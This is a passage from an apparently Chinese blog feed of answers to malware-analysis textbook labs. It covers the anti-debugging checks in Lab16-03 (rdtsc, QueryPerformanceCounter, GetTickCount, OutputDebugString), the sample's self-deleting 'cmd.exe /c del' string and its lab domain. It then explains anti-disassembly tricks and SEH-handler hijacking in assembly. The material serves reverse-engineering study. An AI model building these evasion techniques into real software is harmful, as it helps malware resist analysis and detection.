class="hljs-number">1</span>;<br>    aP[v3] &amp;= <span class="hljs-number">0x19</span>u;<br>    aP[v3] += <span class="hljs-string">&#x27;a&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>11.哪种反调试技术为调试器和命令行设置不同的密码？如何防御它们？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD <span class="hljs-title function_">sub_401020</span><span class="hljs-params">()</span><br>&#123;<br>  DWORD result; <span class="hljs-comment">// eax</span><br><br>  SetLastError(<span class="hljs-string">&#x27;09&#x27;</span>);<br>  OutputDebugStringA(OutputString);             <span class="hljs-comment">// b</span><br>  result = GetLastError();<br>  <span class="hljs-keyword">if</span> ( result == <span class="hljs-string">&#x27;09&#x27;</span> )<br>    ++byte_40A968;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>用<code>NOP</code>替换<code>ADD</code>指令。</p><h3 id="Lab16-3"><a href="#Lab16-3" class="headerlink" title="Lab16-3"></a>Lab16-3</h3><p><strong>使用调试器分析Lab16-03.exe中的恶意代码.这个恶意代码与Lab09-02.exe中的相似，不同之处使做了一些修改，引入了反调试技术。如果你在分析的过程中被卡住，请查看Lab9-2.</strong></p><p><strong>问题</strong></p><p><strong>1.当使用静态分析法分析这个二进制文件时，你看到了哪些字符串？</strong></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Address</span><span class="hljs-built_in">Length</span><span class="hljs-variable">Type</span><span class="hljs-built_in">String</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004050</span><span class="hljs-variable">E4</span><span class="hljs-number">00000017</span><span class="hljs-built_in">C</span><span class="hljs-type">__GLOBAL</span><span class="hljs-type">_HEAP</span><span class="hljs-type">_SELECTED</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004050</span><span class="hljs-variable">FC</span><span class="hljs-number">00000015</span><span class="hljs-built_in">C</span><span class="hljs-type">__MSVCRT</span><span class="hljs-type">_HEAP</span><span class="hljs-type">_SELECT</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405114</span><span class="hljs-number">0000000</span><span class="hljs-variable">F</span><span class="hljs-built_in">C</span><span class="hljs-variable">runtime</span> <span class="hljs-variable">error</span> <br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405128</span><span class="hljs-number">0000000</span><span class="hljs-built_in">E</span><span class="hljs-built_in">C</span><span class="hljs-variable">TLOSS</span> <span class="hljs-variable">error</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405138</span><span class="hljs-number">0000000</span><span class="hljs-built_in">D</span><span class="hljs-built_in">C</span><span class="hljs-variable">SING</span> <span class="hljs-variable">error</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405148</span><span class="hljs-number">0000000</span><span class="hljs-variable">F</span><span class="hljs-built_in">C</span><span class="hljs-variable">DOMAIN</span> <span class="hljs-variable">error</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405158</span><span class="hljs-number">00000025</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6028</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">unable</span> <span class="hljs-variable">to</span> <span class="hljs-variable">initialize</span> <span class="hljs-variable">heap</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405180</span><span class="hljs-number">00000035</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6027</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-variable">lowio</span> <span class="hljs-variable">initialization</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004051</span><span class="hljs-variable">B8</span><span class="hljs-number">00000035</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6026</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-variable">stdio</span> <span class="hljs-variable">initialization</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004051</span><span class="hljs-variable">F0</span><span class="hljs-number">00000026</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6025</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">pure</span> <span class="hljs-variable">virtual</span> <span class="hljs-variable">function</span> <span class="hljs-variable">call</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405218</span><span class="hljs-number">00000035</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6024</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-type">_onexit</span><span class="hljs-operator">/</span><span class="hljs-variable">atexit</span> <span class="hljs-variable">table</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405250</span><span class="hljs-number">00000029</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6019</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">unable</span> <span class="hljs-variable">to</span> <span class="hljs-variable">open</span> <span class="hljs-variable">console</span> <span class="hljs-variable">device</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">0040527</span><span class="hljs-built_in">C</span><span class="hljs-number">00000021</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6018</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">unexpected</span> <span class="hljs-variable">heap</span> <span class="hljs-variable">error</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004052</span><span class="hljs-variable">A0</span><span class="hljs-number">0000002</span><span class="hljs-built_in">D</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6017</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">unexpected</span> <span class="hljs-variable">multithread</span> <span class="hljs-variable">lock</span> <span class="hljs-variable">error</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004052</span><span class="hljs-variable">D0</span><span class="hljs-number">0000002</span><span class="hljs-built_in">C</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6016</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-variable">thread</span> <span class="hljs-variable">data</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004052</span><span class="hljs-variable">FC</span><span class="hljs-number">00000021</span><span class="hljs-built_in">C</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nabnormal</span> <span class="hljs-variable">program</span> <span class="hljs-variable">termination</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405320</span><span class="hljs-number">0000002</span><span class="hljs-built_in">C</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6009</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-variable">environment</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">0040534</span><span class="hljs-built_in">C</span><span class="hljs-number">0000002</span><span class="hljs-variable">A</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6008</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">not</span> <span class="hljs-variable">enough</span> <span class="hljs-variable">space</span> <span class="hljs-variable">for</span> <span class="hljs-variable">arguments</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405378</span><span class="hljs-number">00000025</span><span class="hljs-built_in">C</span><span class="hljs-variable">R6002</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">-</span> <span class="hljs-variable">floating</span> <span class="hljs-variable">point</span> <span class="hljs-variable">not</span> <span class="hljs-variable">loaded</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004053</span><span class="hljs-variable">A0</span><span class="hljs-number">00000025</span><span class="hljs-built_in">C</span><span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Visual</span> <span class="hljs-built_in">C</span><span class="hljs-operator">++</span> <span class="hljs-variable">Runtime</span> <span class="hljs-variable">Library</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004053</span><span class="hljs-variable">CC</span><span class="hljs-number">0000001</span><span class="hljs-variable">A</span><span class="hljs-built_in">C</span><span class="hljs-variable">Runtime</span> <span class="hljs-variable">Error</span><span class="hljs-operator">!</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">nProgram</span><span class="hljs-operator">:</span> <br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">004053</span><span class="hljs-variable">EC</span><span class="hljs-number">00000017</span><span class="hljs-built_in">C</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">program</span> <span class="hljs-variable">name</span> <span class="hljs-variable">unknown</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405404</span><span class="hljs-number">00000013</span><span class="hljs-built_in">C</span><span class="hljs-variable">GetLastActivePopup</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405418</span><span class="hljs-number">00000010</span><span class="hljs-built_in">C</span><span class="hljs-variable">GetActiveWindow</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405428</span><span class="hljs-number">0000000</span><span class="hljs-built_in">C</span><span class="hljs-built_in">C</span><span class="hljs-variable">MessageBoxA</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405434</span><span class="hljs-number">0000000</span><span class="hljs-variable">B</span><span class="hljs-built_in">C</span><span class="hljs-variable">user32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405614</span><span class="hljs-number">0000000</span><span class="hljs-built_in">D</span><span class="hljs-built_in">C</span><span class="hljs-variable">KERNEL32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">00405632</span><span class="hljs-number">0000000</span><span class="hljs-built_in">C</span><span class="hljs-built_in">C</span><span class="hljs-variable">SHELL32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">.</span><span class="hljs-variable">rdata</span><span class="hljs-operator">:</span><span class="hljs-number">0040564</span><span class="hljs-built_in">C</span><span class="hljs-number">0000000</span><span class="hljs-variable">B</span><span class="hljs-built_in">C</span><span class="hljs-type">WS2_</span><span class="hljs-number">32.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">.</span><span class="hljs-variable">data</span><span class="hljs-operator">:</span><span class="hljs-number">00406034</span><span class="hljs-number">00000008</span><span class="hljs-built_in">C</span><span class="hljs-variable">cmd</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-operator">.</span><span class="hljs-variable">data</span><span class="hljs-operator">:</span><span class="hljs-number">0040603</span><span class="hljs-built_in">C</span><span class="hljs-number">00000008</span><span class="hljs-built_in">C</span> <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-variable">NUL</span><br><span class="hljs-operator">.</span><span class="hljs-variable">data</span><span class="hljs-operator">:</span><span class="hljs-number">00406044</span><span class="hljs-number">00000008</span><span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-variable">c</span> <span class="hljs-variable">del</span> <br><span class="hljs-operator">.</span><span class="hljs-variable">data</span><span class="hljs-operator">:</span><span class="hljs-number">0040605</span><span class="hljs-variable">F</span><span class="hljs-number">00000005</span><span class="hljs-built_in">C</span>\<span class="hljs-variable">vQ</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">v</span>\<span class="hljs-variable">b</span><br></code></pre></td></tr></table></figure><p><strong>2.当运行这个二进制文件时会发生什么？</strong></p><p>黑框一闪，没有其他迹象了。</p><p><strong>3.如何重命名它才能使这个二进制文件正常运行？</strong></p><p>先进入调试器调试在<code>401518</code>处下断点发现如下字符串作为<code>_strncmp</code>的参数：<code>qgr.exe</code>，但是发现用这个字符串作为文件名还是不行，因此觉得代码可能判断程序自身是否被调试来进入不同的执行流程</p><p><strong>4.这个恶意代码使用了哪些反调试技术？</strong></p><p><code>rdtsc</code>技术：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401300</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// kr04_4</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rax</span><br>  __int64 v5; <span class="hljs-comment">// ST08_8</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// ST24_4</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+14h] [ebp-Ch]</span><br><br>  v3 = <span class="hljs-built_in">strlen</span>(a1) + <span class="hljs-number">1</span>;<br>  v4 = __rdtsc();<br>  v5 = v4;<br>  v6 = __rdtsc();<br>  v7 = v6 - v5;<br>  result = HIDWORD(v5);<br>  <span class="hljs-keyword">if</span> ( v7 &gt; <span class="hljs-number">01720440</span> )<br>    Del_self_sub_4010E0();<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">28</span>; ++i )<br>  &#123;<br>    *(i + a3) = a1[i % (v3 - <span class="hljs-number">1</span>)] ^ *(i + a2);<br>    result = i + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QueryPerformanceCounter</code>技术：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4011E0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-11Ch]</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [esp+10h] [ebp-118h]</span><br>  LARGE_INTEGER v4; <span class="hljs-comment">// [esp+18h] [ebp-110h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+20h] [ebp-108h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+21h] [ebp-107h]</span><br>  __int16 v7; <span class="hljs-comment">// [esp+11Dh] [ebp-Bh]</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [esp+11Fh] [ebp-9h]</span><br>  LARGE_INTEGER PerformanceCount; <span class="hljs-comment">// [esp+120h] [ebp-8h]</span><br><br>  v3 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v6, <span class="hljs-number">0</span>, <span class="hljs-number">0xFC</span>u);<br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  QueryPerformanceCounter(&amp;PerformanceCount);<br>  result = QueryPerformanceCounter(&amp;v4);<br>  <span class="hljs-keyword">if</span> ( (v4.LowPart - PerformanceCount.LowPart) &gt; <span class="hljs-number">1200</span> )<br>    v3 = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i )<br>  &#123;<br>    *(i + a1) += v3 * (i + <span class="hljs-number">1</span>);<br>    result = i + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GetTickCount</code>技术：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">v14 = GetTickCount();<br>  sub_401000();<br>  v12 = GetTickCount();<br>  <span class="hljs-keyword">if</span> ( v12 - v14 &lt;= <span class="hljs-number">1</span> )<br>  &#123;<br>      <span class="hljs-comment">//......</span><br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>5.对每一种反调试技术而言，如果恶意代码确定它运行在调试器中，它将做什么？</strong></p><p><code>rdtsc</code>技术：当两次<code>rdtsc()</code>调用之间的时间差大于500000时程序会删除自身。</p><p><code>QueryPerformanceCounter</code>技术：会检测运行时间，如果运行时间过长则会改变运行结果的值。</p><p><code>GetTickCount</code>技术：如果检测成功程序会返回一个异常。</p><p><strong>6.为什么反调试技术能在这个恶意代码中成功？</strong></p><p>程序修改了SEH链，在程序运行期间会产生异常，再判断异常处理的时间差从而判断是否处于调试状态。</p><p><strong>7.恶意代码使用了什么域名？</strong></p><p><code>adg.malwareanalysisbook.com</code></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>反调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>防反汇编技术</title>
    <link href="/2019/03/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/03/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>所谓对抗反汇编技术，就是在程序中使用一些特殊构造的代码或数据，让反汇编分析工具产生不正确的程序代码列表。这种技术由恶意代码编写者手工构造，在恶意代码编译和部署阶段使用一个单独的混淆工具，或是直接在源码中插入混淆代码。除了延缓或者防止人工分析以外，防反汇编技术也能在一定程度上阻碍特定的自动化分析技术。</p><p><strong>线性反汇编：</strong>线性反汇编策略是遍历一个代码段，一次一条指令地线性反汇编，线性反汇编用已经反汇编地指令大小来决定下一个要反汇编的字节，而不考虑代码流的控制指令。</p><p><strong>面向代码流的反汇编：</strong>面向代码流的反汇编算法是一种更先进的反汇编宣发，这种算法会根据后续代码的逻辑来选择汇编的字节流，因此结果一般情况下会更加准确。</p><p><strong>相同目标的跳转指令：</strong>恶意代码中最常见的防反汇编技术是使用指向同一目标地址的两个连续条件跳转指令。例如<code>jz loc_512</code>之后是 <code>jnz loc_512</code>则这个指令就相当于无条件跳转指令<code>jmp</code>，另外程序可能会在代码中插入与指令相同额数据如用E8来冒充call指令，实际上使用的是E8后面的字节，E8并没有发挥作用。遇到这种情况可以使用快捷键D使代码变成数据。</p><span id="more"></span><p><strong>使用固定的跳转指令：</strong>程序会使用<code>xor eax, eax</code>开头，再跟上条件跳转指令，使反汇编器一位这是一个条件跳转指令实际上是一个固定的跳转指令。</p><p><strong>无效的反汇编指令：</strong>程序通过插入单字节的流氓无效指令来干扰反汇编器的正常分析进程。</p><p><strong>函数指针问题：</strong>再程序中刻意使用函数指针可以大大降低反汇编器自动推导出的程序的信息量，如果带汇编语言中刻意使用函数指针或者在源码中构造不标准的函数指针格式，会导致在没有动态分析的前提下很难进行逆向工程。如将某一个函数的偏移地址存入<code>eax</code>，再通过<code>call eax</code>的形式来调用函数。</p><p><strong>通过添加代码交叉引用来修复函数指针混淆：</strong>可以使用IDC脚本来修复混淆的函数调用，例如下列代码是来指明函数4011DE交叉引用来源的位置，交叉引用指向的位置，以及流的类型（call指令类型<code>fl_CF</code>，或是跳转指令类型<code>fl_JF</code>）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">AddCodeXref</span><span class="hljs-params">(<span class="hljs-number">0</span>x4011DE,<span class="hljs-number">0</span>x4011AB,fl_CF)</span></span><br></code></pre></td></tr></table></figure><p><code>retn</code>通常被用来返回一个函数调用滥用返回指针：再程序中<code>call</code>指令和<code>jmp</code>指令并不是唯一控制转换控制流的指令。与<code>call</code>指令对应的是<code>retn</code>，<code>call</code>指令与<code>jmp</code>指令的差别是<code>call</code>会将函数的返回地址压入栈中，返回点是一个紧跟call指令的一个内存地址。<code>call</code>指令相当于<code>jmp</code>指令加<code>push</code>指令，<code>retn</code>指令相当于<code>jmp</code>指令加<code>pop</code>指令，<code>retn</code>指令首先从栈顶弹出一个返回值，然后跳转到返回地址，<code>retn</code>指令通常被用来返沪一个函数调用，但是由于体系结构的限制，他一般不能用于控制执行流。</p><p><strong>滥用结构化异常处理：</strong>结构化异常处理（SEH）提供一种控制流的方法，该方法不能被反汇编器采用，但可以用来欺骗反汇编器，<code>SEH</code>旨在位程序提供一种智能处理错误条件的方法没编程语言例如<code>C++</code>严重依赖异常处理。异常触发可能有多种原因，例如访问一个无效的内存区域、除零等。可以调用函数<code>RaiseException</code>函数产生额外的软件异常，<code>SEH</code>是一个函数列表，设计他的目的是处理线程中的异常，列表中的每个函数，要么处理异常，要么将异常传递给下一个异常处理函数，如果一个异常总是被传递到最后一个异常处理函数中，就会被认为这是一个不能处理的异常，这种情况下，最后一个异常处理函数会弹出一个熟悉的消息对话框，通知用户产生了一个无法处理的异常，为了查找SEH链，操作系统会检查FS段寄存器。这个寄存器包含一个段选择子可以得到线程环境块（TEB）。<code>TEB</code>的第一个数据结构是线程信息块<code>TIB</code>，<code>TIB</code>中的第一个元素及<code>TIB</code>的第一个字节就是SEH链的指针，SEH链是一个简单的8字节数据结构链表，这八个字节数据结构叫做<code>EXCEPETION_REGISTRATION</code>记录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span>&#123;</span><br>    DWORD prev; <span class="hljs-comment">//指向前一个记录的指针</span><br>    DWORD handler; <span class="hljs-comment">//指向异常处理的指针</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从概念上讲，这个链表以栈的方式进行操作，第一个调用的是最后一个加入链表的记录，由于子进程的调用与嵌套异常处理块的原因，SEH链的增长和缩小等同于程序中异常处理层的改变，所以SEH记录总是在栈上。</p><p>为了实现向<code>SEH</code>中添加函数，需要在栈上构造一条新的记录，因为记录结构由两个<code>DWORD</code>变量组成，所以使用两个<code>push</code>指令来完成，栈的增长方向是从下向上，所以第一个<code>push</code>进栈的是异常处理函数指针，第二个是下一条记录的指针，当添加一条记录到链表头部时，下一条记录需要完成异常处理的是当前的栈顶，它由<code>fs:[0]</code>指针指出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push ExceptionHandler<br>push fs:[0]<br>mov fs:[0],esp<br></code></pre></td></tr></table></figure><p>异常发生时，首先将调用函数<code>ExceptionHandler</code>，这个动作会受到微软的<code>DEP</code>保护的限制 ，对于DEP他的目的是阻止应用程序在运行的过程中添加第三方的异常处理，可以使用支持<code>SafeSEH</code>指令的汇编器，另外，使用微软的C编译器也能到达此目的，添加<code>/SAFESEH:NO</code>到链接器命令行就可以使这种限制失效。</p><p>当调用<code>ExceptionHandler</code>函数时，栈将大幅改变。我们需要知道怎么返回异常发生前的栈位置，当异常处理被调用时，操作系统添加了其他的<code>SEH</code>处理，为了让程序恢复正常操作，我们需要将异常处理从异常处理链中断开，还要将系如添加的异常处理从异常处理链中断开，因此我们需要从<code>esp+8</code>而不是<code>esp</code>中取出原始的栈指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov esp, [esp+8]<br>mov eax, 